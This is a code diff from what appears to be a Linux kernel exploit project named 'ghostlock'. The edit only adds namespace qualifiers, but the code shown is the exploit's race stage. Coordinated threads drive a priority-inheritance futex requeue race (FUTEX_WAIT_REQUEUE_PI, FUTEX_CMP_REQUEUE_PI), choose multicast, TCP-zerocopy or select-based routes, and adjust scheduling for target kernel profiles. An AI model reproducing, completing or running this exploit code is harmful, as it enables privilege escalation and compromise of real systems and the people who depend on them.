@@ -20,10 +20,10 @@ namespace ghostlock::race {
 void *waiter_thread(void *arg) {
     auto *race = static_cast<PiRaceContext *>(arg);
     const WriteRequest *request = race->request;
-    disable_rseq_for_thread();
+    ghostlock::support::disable_rseq_for_thread();
     int tid = (int) syscall(SYS_gettid);
     atomic_store(&race->waiter_tid, tid);
-    if (futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
+    if (ghostlock::support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
         pr_error("waiter lock chain errno=%d\n", errno);
     atomic_store(&race->waiter_ready, 1);
     while (!atomic_load(&race->owner_started))
@@ -47,11 +47,11 @@ void *waiter_thread(void *arg) {
         }
     }
     atomic_store(&race->waiter_waiting, 1);
-    futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+    ghostlock::support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
             &race->target_futex, 0);
-    RouteKind selected = kernel5_route_selected()
+    RouteKind selected = ghostlock::support::kernel5_route_selected()
             ? ROUTE_KIND_MULTICAST_WAITER
-            : (tcp_route_selected()
+            : (ghostlock::support::tcp_route_selected()
                     ? ROUTE_KIND_TCP_ZEROCOPY
                     : ROUTE_KIND_SELECT_STACK);
     RouteController controller;
@@ -69,11 +69,11 @@ void *waiter_thread(void *arg) {
         uint32_t dummy_pi = 0x80000000U | (uint32_t) getpid();
         struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
         errno = 0;
-        long disarm = futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
+        long disarm = ghostlock::support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
         pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
     }
     atomic_store(&race->route_done, 1);
-    futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
     while (!atomic_load(&race->owner_chain_done))
         usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
     return NULL;
@@ -83,8 +83,8 @@ void *waiter_thread(void *arg) {
  * output: synchronization state; lifecycle owned by PiRace (CPP09). */
 void *owner_thread(void *arg) {
     auto *race = static_cast<PiRaceContext *>(arg);
-    disable_rseq_for_thread();
-    long lock_target = futex_op(
+    ghostlock::support::disable_rseq_for_thread();
+    long lock_target = ghostlock::support::futex_op(
             &race->target_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
     if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
     while (!atomic_load(&race->waiter_ready) &&
@@ -92,15 +92,15 @@ void *owner_thread(void *arg) {
         usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
     if (atomic_load(&race->owner_stop)) {
         if (lock_target == 0)
-            futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+            ghostlock::support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
         return NULL;
     }
     atomic_store(&race->owner_started, 1);
-    futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
     atomic_store(&race->owner_chain_done, 1);
     while (!atomic_load(&race->owner_stop)) sleep(1);
     if (lock_target == 0)
-        futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+        ghostlock::support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
     return NULL;
 }
 
@@ -109,7 +109,7 @@ void *owner_thread(void *arg) {
  * lifecycle owned by PiRace (CPP09). */
 void *consumer_thread(void *arg) {
     auto *race = static_cast<PiRaceContext *>(arg);
-    disable_rseq_for_thread();
+    ghostlock::support::disable_rseq_for_thread();
     pin_to_core((size_t) race->consumer_cpu);
     pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
     int seen = 0;
@@ -139,13 +139,13 @@ void *consumer_thread(void *arg) {
                 int consumer_nice = target_profile_has_compact_waiter(&g_target_profile)
                         ? (calls_this_seq % 19) + 1
                         : PSELECT_CONSUMER_NICE;
-                long sched_ret = sched_setattr_tid(tid, consumer_nice);
+                long sched_ret = ghostlock::support::sched_setattr_tid(tid, consumer_nice);
                 if (sched_ret != 0) {
                     struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
-                    long fret = futex_op(
+                    long fret = ghostlock::support::futex_op(
                             &race->target_futex, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
                     if (fret == 0) {
-                        futex_op(
+                        ghostlock::support::futex_op(
                                 &race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
                         sched_ret = 0;
                     }
@@ -187,7 +187,7 @@ RouteStatus ghostlock::PiRace::run() noexcept {
             ? 5000
             : ghostlock::ops::execution_settings()->race_setup_settle_us);
     errno = 0;
-    long rq = futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1, (void *) 1,
+    long rq = ghostlock::support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1, (void *) 1,
             &target_futex, 0);
     pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
             rq, errno);
